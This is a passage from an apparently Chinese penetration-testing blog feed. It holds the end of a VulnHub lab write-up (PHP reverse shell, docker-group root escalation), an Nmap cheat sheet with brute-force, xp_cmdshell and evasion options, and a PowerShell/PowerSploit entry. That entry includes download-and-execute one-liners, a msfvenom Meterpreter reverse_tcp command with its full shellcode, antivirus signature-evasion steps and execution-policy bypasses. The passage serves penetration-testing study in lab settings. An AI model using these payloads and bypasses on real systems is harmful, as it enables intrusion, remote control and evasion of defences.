rel="noopener">php反弹shell代码</a></li><li><img src="/vulnhub%E4%B9%8Bchakravyuh/13.png" alt></li><li>修改反弹到指定IP与端口，开启监听，点击save</li><li><img src="/vulnhub%E4%B9%8Bchakravyuh/14.png" alt></li><li>反弹shell成功，使用Python获取一个伪终端</li><li><img src="/vulnhub%E4%B9%8Bchakravyuh/15.png" alt></li><li>提权，前面知道有个docker用户组，使用docker时，所有命令都需要sudo，因为docker需要root才能运行。</li><li>docker守护进程的工作方式是允许其访问root用户或docker组的其他任何用户，说明不需要任何密码即可对docker组进行访问。</li><li>查看镜像docker images</li><li><img src="/vulnhub%E4%B9%8Bchakravyuh/16.png" alt></li><li>使用docker -v /root:/mnt -it alpine #-v 绑定挂载目录，宿主机/root，docker镜像中的/mnt，-it 终端交互模式</li><li><img src="/vulnhub%E4%B9%8Bchakravyuh/17.png" alt></li><li><img src="/vulnhub%E4%B9%8Bchakravyuh/18.png" alt></li><li>未完</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap</title>
      <link href="/Nmap/"/>
      <url>/Nmap/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Nmap"><a href="#0x00-Nmap" class="headerlink" title="0x00 Nmap"></a>0x00 Nmap</h2><p><img src="/Nmap/1.jpg" alt></p><h2 id="0x10-扫描目标"><a href="#0x10-扫描目标" class="headerlink" title="0x10 扫描目标"></a>0x10 扫描目标</h2><ol><li>nmap ip、domain、ip/24、192.168.0-254.1-254</li><li>nmap -iL ips.txt #扫描ip列表</li><li>nmap –exclute 192.168.10.1,192.168.10.4 #排除IP</li><li>nmap –excludefile ips.txt</li><li>nmap -iR 200 #随机200个目标</li></ol><h2 id="0x11-主机发现"><a href="#0x11-主机发现" class="headerlink" title="0x11 主机发现"></a>0x11 主机发现</h2><ol><li>nmap -sL 192.168.0.1/24 #只是列出主机，不会发送任何报文</li><li>nmap -sn IP #ping 扫描</li><li>nmap -Pn IP #禁ping扫描，默认主机存活，更深服务扫描</li><li>-PS #TCP SYN ping扫描，发送一个设置了SYN标志位的空TCP报文，默认80端口</li><li>-PA #TCP ACK ping扫描，发送一个设置了ACK标志位的空TCP报文，如果目标主机运行的话，总是会回应一个RST报文，有的防火墙会拦截SYN报文，而不拦截ACK报文。</li><li>-PU #UDP ping扫描，默认31338端口</li><li>-PR #ARP ping扫描</li><li>-n #不解析域名</li><li>-R #解析域名</li><li>–system-dns #使用系统域名解析器</li><li>–dns-servers #指定自定义DNS服务器</li><li>–traceroute #跟踪到每个主机的跃点路径</li></ol><h2 id="0x12-端口扫描"><a href="#0x12-端口扫描" class="headerlink" title="0x12 端口扫描"></a>0x12 端口扫描</h2><ol><li>-sS #TCP SYN</li><li>-sT #TCP connect()扫描</li><li>-sU #UDP扫描，常见DNS53、SNMP161/162、DHCP67/68</li><li>-sN #Null扫描，不设置任何标志位</li><li>-sF #FIN扫描，只设置TCP FIN标志位</li><li>-sA #TCP ACK扫描</li><li>–scanflags #定制TCP扫描</li><li>-p8080,-p1-65535,-p U:53,111,T:445 #指定端口</li><li>–exclude-ports #排除端口 </li><li>-F #快速模式</li><li>-r #连续扫描端口，不随机</li></ol><h2 id="0x13-服务扫描"><a href="#0x13-服务扫描" class="headerlink" title="0x13 服务扫描"></a>0x13 服务扫描</h2><ol><li>-sV #扫描开启端口的服务与版本</li><li>–version-intensity #版本强度，0-9</li><li>–version-light #2</li><li>–version-all #9</li><li>–version-trace #显示详细的版本扫描活动</li></ol><h2 id="0x14-系统检测"><a href="#0x14-系统检测" class="headerlink" title="0x14 系统检测"></a>0x14 系统检测</h2><ol><li>-O #启用操作系统检测</li><li>-A #启用操作系统检测等</li></ol><h2 id="0x15-其他"><a href="#0x15-其他" class="headerlink" title="0x15 其他"></a>0x15 其他</h2><ol><li>-T #时序模板，0-5</li><li>–host-timeout #超时</li><li>–scan-delay/–max-scan-delay #扫描延迟</li><li>-F,–mtu #分段数据包</li><li>-D #使用诱饵隐蔽扫描</li><li>-S #源地址欺骗</li><li>-e #使用指定的接口</li><li>-g,–source-port #源端口欺骗</li><li>–proxies #代理</li><li>–data 16进制字符串 #将自定义payload附加到发送的数据包</li><li>–data-string 字符串 #将自定义ASCII字符串附加到发送的数据包</li><li>–data-length #将随机数据追加到发送的数据包</li></ol><h2 id="0x20-脚本扫描"><a href="#0x20-脚本扫描" class="headerlink" title="0x20 脚本扫描"></a>0x20 脚本扫描</h2><ol><li>-sC #等于–script=default</li><li>–script=&lt;Lua 脚本&gt;</li><li>–script=1.nse,2.nse</li><li>–script-args=&lt;n1=v1,n2=v2&gt; #脚本参数</li><li>–script-args-file=filename</li><li>–script-trace #显示所有发送和接收的数据</li><li>–script-updatedb #更新脚本数据库</li><li>–script-help = &lt;Lua脚本&gt;</li></ol><h2 id="0x21-常见脚本扫描"><a href="#0x21-常见脚本扫描" class="headerlink" title="0x21 常见脚本扫描"></a>0x21 常见脚本扫描</h2><p><strong>Oracle</strong></p><ol><li>nmap –script oracle-sid-brute IP</li><li>nmap –script -p 1521 –script-args oracle-brute.sid=XE IP</li></ol><p><strong>Sql Server</strong></p><ol><li>nmap -p1433 –script ms-sql-info Domain/IP #搜集mssql数据库信息</li><li>nmap -p1433 –script ms-sql-brute Domain/IP #爆破mssql身份验证</li><li>nmap -p1433 –script ms-sql-brute –script-args userdb=/tmp/user.txt,passdb=/tmp/pass.txt Domain/IP #爆破账号密码</li><li>nmap -p1433 –script ms-sql-empty-password Domain/IP #验证空密码</li><li>nmap -p1433 –script ms-sql-hasdbaccess.nse –script-args mssql.username=sa Domain/IP #用户sa，空密码，直连数据库</li><li>nmap -p1433 –script ms-sql-tables –script-args mssql.username=sa Domain/IP #查询数据表</li><li>nmap -p1433 –script ms-sql-xp-cmdshell –script-args=ms-sql-xp-cmdshell.cmd=’whoami’,mssql.username=sa Domain/IP #执行操作系统命令</li><li><img src="/Nmap/1.png" alt></li></ol><p><strong>WAF</strong></p><ol><li>nmap –script=firewalk –traceroute Domain/IP #防火墙检测</li><li>nmap –traceroute –script firewalk –script-args firewalk.recv-timeout=60000,firewalk.max-active-probes=3,firewalk.probe-timeout=600 Domain/IP</li><li>nmap -p80 –script http-waf-detect Domain/IP</li><li>nmap -f Domain/IP #碎片扫描</li><li>nmap -mtu 8 Domain/IP #碎片扫描</li><li>nmap -D RND:10 Domain/IP #诱饵扫描</li><li>nmap -D decoy1,decoy2,decoy3 Domain/IP #诱饵扫描</li><li>nmap –data-length Domain/IP #随机数据长度扫描</li><li>nmap –sT -PN –spoof-mac 0 Domain/IP #欺骗扫描</li><li>nmap –badsum Domain/IP #欺骗扫描</li></ol><h2 id="0x30-其他扫描"><a href="#0x30-其他扫描" class="headerlink" title="0x30 其他扫描"></a>0x30 其他扫描</h2><h3 id="0x31-空闲扫描"><a href="#0x31-空闲扫描" class="headerlink" title="0x31 空闲扫描"></a>0x31 空闲扫描</h3><ol><li>nmap -p80 –script ipidseq -iR 1000 #随机1000个目标</li><li>nmap -p80 –script ipidseq IP/24 #指定网段</li><li>nmap -Pn -sI IP1 IP2 #IP1：空闲主机，IP2：目标主机</li></ol><h2 id="0xF0-Nmap帮助信息"><a href="#0xF0-Nmap帮助信息" class="headerlink" title="0xF0 Nmap帮助信息"></a>0xF0 Nmap帮助信息</h2><pre><code>Nmap 7.80 ( https://nmap.org )Usage: nmap [Scan Type(s)] [Options] {target specification}TARGET SPECIFICATION:  Can pass hostnames, IP addresses, networks, etc.  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254  -iL &lt;inputfilename&gt;: Input from list of hosts/networks  -iR &lt;num hosts&gt;: Choose random targets  --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks  --excludefile &lt;exclude_file&gt;: Exclude list from fileHOST DISCOVERY:  -sL: List Scan - simply list targets to scan  -sn: Ping Scan - disable port scan  -Pn: Treat all hosts as online -- skip host discovery  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes  -PO[protocol list]: IP Protocol Ping  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]  --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers  --system-dns: Use OS&#39;s DNS resolver  --traceroute: Trace hop path to each hostSCAN TECHNIQUES:  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans  -sU: UDP Scan  -sN/sF/sX: TCP Null, FIN, and Xmas scans  --scanflags &lt;flags&gt;: Customize TCP scan flags  -sI &lt;zombie host[:probeport]&gt;: Idle scan  -sY/sZ: SCTP INIT/COOKIE-ECHO scans  -sO: IP protocol scan  -b &lt;FTP relay host&gt;: FTP bounce scanPORT SPECIFICATION AND SCAN ORDER:  -p &lt;port ranges&gt;: Only scan specified ports    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9  --exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning  -F: Fast mode - Scan fewer ports than the default scan  -r: Scan ports consecutively - don&#39;t randomize  --top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports  --port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt;SERVICE/VERSION DETECTION:  -sV: Probe open ports to determine service/version info  --version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes)  --version-light: Limit to most likely probes (intensity 2)  --version-all: Try every single probe (intensity 9)  --version-trace: Show detailed version scan activity (for debugging)SCRIPT SCAN:  -sC: equivalent to --script=default  --script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of           directories, script-files or script-categories  --script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts  --script-args-file=filename: provide NSE script args in a file  --script-trace: Show all data sent and received  --script-updatedb: Update the script database.  --script-help=&lt;Lua scripts&gt;: Show help about scripts.           &lt;Lua scripts&gt; is a comma-separated list of script-files or           script-categories.OS DETECTION:  -O: Enable OS detection  --osscan-limit: Limit OS detection to promising targets  --osscan-guess: Guess OS more aggressivelyTIMING AND PERFORMANCE:  Options which take &lt;time&gt; are in seconds, or append &#39;ms&#39; (milliseconds),  &#39;s&#39; (seconds), &#39;m&#39; (minutes), or &#39;h&#39; (hours) to the value (e.g. 30m).  -T&lt;0-5&gt;: Set timing template (higher is faster)  --min-hostgroup/max-hostgroup &lt;size&gt;: Parallel host scan group sizes  --min-parallelism/max-parallelism &lt;numprobes&gt;: Probe parallelization  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;: Specifies      probe round trip time.  --max-retries &lt;tries&gt;: Caps number of port scan probe retransmissions.  --host-timeout &lt;time&gt;: Give up on target after this long  --scan-delay/--max-scan-delay &lt;time&gt;: Adjust delay between probes  --min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second  --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per secondFIREWALL/IDS EVASION AND SPOOFING:  -f; --mtu &lt;val&gt;: fragment packets (optionally w/given MTU)  -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys  -S &lt;IP_Address&gt;: Spoof source address  -e &lt;iface&gt;: Use specified interface  -g/--source-port &lt;portnum&gt;: Use given port number  --proxies &lt;url1,[url2],...&gt;: Relay connections through HTTP/SOCKS4 proxies  --data &lt;hex string&gt;: Append a custom payload to sent packets  --data-string &lt;string&gt;: Append a custom ASCII string to sent packets  --data-length &lt;num&gt;: Append random data to sent packets  --ip-options &lt;options&gt;: Send packets with specified ip options  --ttl &lt;val&gt;: Set IP time-to-live field  --spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address  --badsum: Send packets with a bogus TCP/UDP/SCTP checksumOUTPUT:  -oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,     and Grepable format, respectively, to the given filename.  -oA &lt;basename&gt;: Output in the three major formats at once  -v: Increase verbosity level (use -vv or more for greater effect)  -d: Increase debugging level (use -dd or more for greater effect)  --reason: Display the reason a port is in a particular state  --open: Only show open (or possibly open) ports  --packet-trace: Show all packets sent and received  --iflist: Print host interfaces and routes (for debugging)  --append-output: Append to rather than clobber specified output files  --resume &lt;filename&gt;: Resume an aborted scan  --stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to HTML  --webxml: Reference stylesheet from Nmap.Org for more portable XML  --no-stylesheet: Prevent associating of XSL stylesheet w/XML outputMISC:  -6: Enable IPv6 scanning  -A: Enable OS detection, version detection, script scanning, and traceroute  --datadir &lt;dirname&gt;: Specify custom Nmap data file location  --send-eth/--send-ip: Send using raw ethernet frames or IP packets  --privileged: Assume that the user is fully privileged  --unprivileged: Assume the user lacks raw socket privileges  -V: Print version number  -h: Print this help summary page.EXAMPLES:  nmap -v -A scanme.nmap.org  nmap -v -sn 192.168.0.0/16 10.0.0.0/8  nmap -v -iR 10000 -Pn -p 80SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Powershell</title>
      <link href="/Powershell/"/>
      <url>/Powershell/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Powershell"><a href="#0x00-Powershell" class="headerlink" title="0x00 Powershell"></a>0x00 Powershell</h2><p><img src="/Powershell/1.png" alt></p><h2 id="0x10-常用命令"><a href="#0x10-常用命令" class="headerlink" title="0x10 常用命令"></a>0x10 常用命令</h2><ol><li>powershell.exe [-help、-?、/?] #查看帮助</li><li>$PSVersionTable.PSVersion #查看powershell版本</li><li>get-host #powershell版本等信息</li><li>get-process #获取所有进程</li><li>get-help [keyword] #获取帮助</li><li><a href="#get-executionpolicy">get-executionpolicy #查看执行策略，Restricted：限制</a></li><li>Get-ExecutionPolicy -list #查看执行策略</li><li>set-executionpolicy unrestricted #设置执行策略</li><li>get-command #列出所有命令</li><li><a href="#alias">get-alias #列出所有别名</a></li></ol><h3 id="0x11-下载"><a href="#0x11-下载" class="headerlink" title="0x11 下载"></a>0x11 下载</h3><ol><li>(new-object system.net.webclient).downloadfile(‘<a href="http://192.168.100.1/test.dll&#39;,&#39;c:\temp\test.dll&#39;" target="_blank" rel="noopener">http://192.168.100.1/test.dll&#39;,&#39;c:\temp\test.dll&#39;</a>)</li></ol><h2 id="0x20-PowerSploit"><a href="#0x20-PowerSploit" class="headerlink" title="0x20 PowerSploit"></a>0x20 <a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">PowerSploit</a></h2><ul><li><a href="https://www.cnblogs.com/yuzly/p/10505365.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/10505365.html</a></li><li><a href="https://www.freebuf.com/column/171993.html" target="_blank" rel="noopener">https://www.freebuf.com/column/171993.html</a></li></ul><ol><li>powersploit是Microsoft PowerShell模块的集合，信息搜集、代码执行、脚本执行、持久化、绕过杀毒软件、渗出、混淆、提权等等</li><li>python -m http.server 80 #切换到指定目录，开启python简单服务器（python2）</li><li><img src="/Powershell/2.png" alt></li><li><img src="/Powershell/3.png" alt></li></ol><h3 id="0x21-AntivirusBypass-防毒软件绕过"><a href="#0x21-AntivirusBypass-防毒软件绕过" class="headerlink" title="0x21 AntivirusBypass 防毒软件绕过"></a>0x21 AntivirusBypass 防毒软件绕过</h3><ol><li>iex(New-Object net.webclient).DownloadString(“<a href="http://192.168.100.1:8888/AntivirusBypass/Find-AVSignature.ps1&quot;" target="_blank" rel="noopener">http://192.168.100.1:8888/AntivirusBypass/Find-AVSignature.ps1&quot;</a>)</li><li>get-help Find-AVSignature</li><li><img src="/Powershell/4.png" alt></li><li>Find-AVSignature -StartByte 0 -EndByte 220000 -Interval 110000 -Path C:\Temp\test.dll -OutPath C:\Temp\test1.dll -Verbose</li><li><img src="/Powershell/5.png" alt></li><li><a href="https://www.virscan.org/" target="_blank" rel="noopener">virscan</a>验证病毒文件（意思是那意思）</li><li>原文件</li><li><img src="/Powershell/6.png" alt></li><li>文件偏移后</li><li><img src="/Powershell/8.png" alt></li><li><img src="/Powershell/7.png" alt></li></ol><h3 id="0x22-CodeExecution-代码执行"><a href="#0x22-CodeExecution-代码执行" class="headerlink" title="0x22 CodeExecution 代码执行"></a>0x22 CodeExecution 代码执行</h3><ol><li>iex(New-Object net.webclient).DownloadString(“<a href="http://192.168.100.1:8888/CodeExecution/Invoke-Shellcode.ps1&quot;" target="_blank" rel="noopener">http://192.168.100.1:8888/CodeExecution/Invoke-Shellcode.ps1&quot;</a>)</li><li>get-help Invoke-Shellcode</li><li><img src="/Powershell/9.png" alt></li><li>get-help Invoke-Shellcode -examples</li><li><img src="/Powershell/11.png" alt></li><li>使用msfvenom生成powershell脚本</li><li>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.100.4 lport=4444 -f powershell &gt; /root/tmp/test</li><li><img src="/Powershell/10.png" alt><pre><code>0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x0,0x0,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x1,0x0,0x0,0x49,0x89,0xe5,0x49,0xbc,0x2,0x0,0x11,0x5c,0xc0,0xa8,0x64,0x4,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x7,0xff,0xd5,0x4c,0x89,0xea,0x68,0x1,0x1,0x0,0x0,0x59,0x41,0xba,0x29,0x80,0x6b,0x0,0xff,0xd5,0x6a,0xa,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xa,0x49,0xff,0xce,0x75,0xe5,0xe8,0x93,0x0,0x0,0x0,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x4,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,0x59,0x68,0x0,0x10,0x0,0x0,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x0,0x40,0x0,0x0,0x41,0x58,0x6a,0x0,0x5a,0x41,0xba,0xb,0x2f,0xf,0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x1,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,0x6a,0x0,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5</code></pre></li><li>开启msfconsole监听端口</li><li><img src="/Powershell/12.png" alt></li><li>执行shellcode</li><li><img src="/Powershell/13.png" alt></li><li>反弹成功</li><li><img src="/Powershell/14.png" alt></li></ol><p><strong><a href="http://localhost:4000/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">Invoke-DllInjection.ps1</a></strong></p><h3 id="0x23-Recon-信息探测"><a href="#0x23-Recon-信息探测" class="headerlink" title="0x23 Recon 信息探测"></a>0x23 Recon 信息探测</h3><ol><li><strong>端口扫描</strong></li><li>iex(New-Object net.webclient).DownloadString(“<a href="http://192.168.100.1:8888/Recon/Invoke-Portscan.ps1&quot;" target="_blank" rel="noopener">http://192.168.100.1:8888/Recon/Invoke-Portscan.ps1&quot;</a>)</li><li><img src="/Powershell/15.png" alt></li><li><strong>目录扫描</strong></li><li>iex(New-Object Net.WebClient).DownloadString(“<a href="http://192.168.100.1:8888/Recon/Get-HttpStatus.ps1&quot;" target="_blank" rel="noopener">http://192.168.100.1:8888/Recon/Get-HttpStatus.ps1&quot;</a>)</li><li><img src="/Powershell/16.png" alt></li><li><img src="/Powershell/17.png" alt></li></ol><h2 id="0x30-绕过powershell执行策略"><a href="#0x30-绕过powershell执行策略" class="headerlink" title="0x30 绕过powershell执行策略"></a>0x30 <span id="get-executionpolicy">绕过powershell执行策略</span></h2><ol><li>查看执行策略</li><li><img src="/Powershell/18.png" alt></li><li>下载并执行</li><li><img src="/Powershell/19.png" alt></li><li><strong>绕过执行脚本</strong></li><li><ul><li>复制命令到命令行执行</li></ul></li><li><img src="/Powershell/20.png" alt></li><li><strong>echo输出到powershell标准输入</strong></li><li><ul><li>echo ‘write-host “test powershell script”‘ | powershell -noprofile -</li></ul></li><li><strong>文件读取到powershell标准输入</strong></li><li><ul><li>get-content test.ps1 | powershell -noprofile -</li></ul></li><li><ul><li>type test.ps1 | powershell -noprofile -</li></ul></li><li><strong>下载并执行</strong></li><li><ul><li>powershell -nop -c “iex(new-object net.webclient).downloadstring(‘<a href="http://192.168.100.1/test.ps1&#39;)&quot;" target="_blank" rel="noopener">http://192.168.100.1/test.ps1&#39;)&quot;</a></li></ul></li><li><strong>使用-command</strong></li><li><ul><li>powershell -command ‘write-host “test powershell script”‘</li></ul></li><li><strong>使用encodecommand</strong></li><li><ul><li>[convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(‘write-host “test powershell script”‘))</li></ul></li><li><ul><li>powershell -encodedcommand dwByAGkAdABlAC0AaABvAHMAdAAgACIAdABlAHMAdAAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIABzAGMAcgBpAHAAdAAiAA==</li></ul></li><li><strong>使用invoke-command</strong></li><li><ul><li>invoke-command -scriptblock {‘write-host “test powershell script”‘}</li></ul></li><li><strong>使用invoke-expression</strong></li><li><ul><li>get-content test.ps1 | invoke-expression</li></ul></li><li><strong>使用IEX</strong></li><li><ul><li>get-content test.ps1 | iex</li></ul></li><li><strong>使用bypass绕过执行策略</strong></li><li><ul><li>powershell -executionpolicy bypass -file .\test.ps1</li></ul></li><li><strong>使用unrestricted绕过执行策略</strong></li><li><ul><li>powershell -executionpolicy unrestricted -file .\test.ps1</li></ul></li><li><strong>使用remote-signed绕过执行策略</strong></li><li><ul><li>powershell -executionpolicy remote-signed -file .\test.ps1</li></ul></li><li><strong>通过替换AuthorizationManager禁用ExecutionPolicy</strong></li><li><ul><li>function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield(“_context”,”nonpublic,instance”).getvalue( $executioncontext)).gettype().getfield(“_authorizationManager”,”nonpublic,instance”).setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager “Microsoft.PowerShell”))}  </li></ul></li><li><ul><li>Disable-ExecutionPolicy </li></ul></li><li><ul><li>.\test.ps1</li></ul></li><li><strong>ExcutionPolicy设置成Process Scope</strong></li><li><ul><li>set-executionpolicy bypass -scope process</li></ul></li><li><ul><li>.\test.ps1</li></ul></li><li><strong>通过命令设置ExcutionPolicy为CurrentUser Scope</strong></li><li><ul><li>Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted</li></ul></li><li><ul><li>.\test.ps1</li></ul></li><li>通过修改注册表设置ExcutionPolicy为CurrentUser Scope</li><li><ul><li>HKEY_CURRENT_USER\Software\MicrosoftPowerShell\1\ShellIds\Microsoft.PowerShell</li></ul></li><li><ul><li>.\test.ps1</li></ul></li></ol><h2 id="0xF0-相关链接"><a href="#0xF0-相关链接" class="headerlink" title="0xF0 相关链接"></a>0xF0 相关链接</h2><ol><li><a href="https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html" target="_blank" rel="noopener">绕过AMSI执行任意恶意PowerShell代码</a></li><li><a href="https://docs.microsoft.com/en-us/powershell/" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/powershell/</a></li><li><a href="https://www.freebuf.com/column/171993.html" target="_blank" rel="noopener">powersploit</a></li></ol><h3 id="0xF1-别名"><a href="#0xF1-别名" class="headerlink" title="0xF1 别名"></a>0xF1 <span id="alias">别名</span></h3><p><img src="/Powershell/21.png" alt></p><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ul><li><a href="https://www.google.com/" target="_blank" rel="noopener">https://www.google.com/</a></li><li><a href="https://www.freebuf.com/articles/system/93829.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/93829.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件解析漏洞</title>
      <link href="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
      <url>/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><h2 id="0x01-总结"><a href="#0x01-总结" class="headerlink" title="0x01 总结"></a>0x01 总结</h2><ol><li>IIS 5.X/6.0</li><li>目录解析：创建*.asp*、*.asa*文件夹，文件夹内的任意扩展名的文件都被IIS当作asp文件来解析</li><li>例子：/1.asp/2.jpg</li><li>文件解析：/1.asp;.jpg</li></ol><h2 id="0x02-IIS-6-0（filepath漏洞）"><a href="#0x02-IIS-6-0（filepath漏洞）" class="headerlink" title="0x02 IIS 6.0（filepath漏洞）"></a>0x02 IIS 6.0（filepath漏洞）</h2><ol><li><strong>环境</strong></li><li>windows server 2003 </li><li><strong>搭建</strong></li><li>下载IIS6.0 i386所需文件</li><li>开始——控制面板——添加或删除程序——添加/删除windows组件——勾选应用程序服务器——详细信息——勾选信息服务IIS、启用网站COM+访问、应用程序服务器控制台——信息服务IIS——详细信息——NNTP/SMTP/万维网服务/FTP——确定——确定——下一步——完成（可能出现所需文件窗口，自行百度）</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1.png" alt></li><li>虚拟机加载windows server 2003的第二个IOS文件，选择安装可选的windows组件——同上——完成</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/3.png" alt></li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/4.png" alt></li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/2.png" alt></li><li>win+R——compmgmt.msc——服务和应用程序——Internet 信息服务（IIS）管理器——网站——默认网站——右击浏览——建设中（说明IIS6安装好了）</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/5.png" alt></li><li><strong>部署</strong></li><li>win+R——inetmgr（打开Internet 信息服务（IIS）管理器）——右击网站——新建——网站</li><li>描述随意</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/8.png" alt></li><li>ip默认或者当前ip</li><li><img 